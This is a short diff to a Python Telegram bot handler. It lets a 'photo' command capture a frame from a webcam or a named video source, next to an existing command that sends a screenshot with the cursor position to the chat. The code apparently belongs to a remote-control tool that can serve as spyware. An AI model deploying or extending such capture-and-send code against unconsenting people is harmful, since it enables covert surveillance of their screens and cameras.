@@ -314,8 +314,11 @@ def echo_all(message):
                 img_byte_arr.seek(0)
                 end = f"YOUR SCREENSHOT WITH CURSOR↑\nPOS: {mouse.get_position()}"
                 bot.send_photo(message.chat.id, img_byte_arr)
-            elif "photo"==b:
-                cap = cv2.VideoCapture(0)
+            elif "photo"in b:
+                if b.split("photo")[1][1:]:
+                    cap = cv2.VideoCapture(b.split("photo")[1][1:])
+                else:
+                    cap = cv2.VideoCapture(0)
                 for i in range(30):
                     cap.read()
                 ret, frame = cap.read()
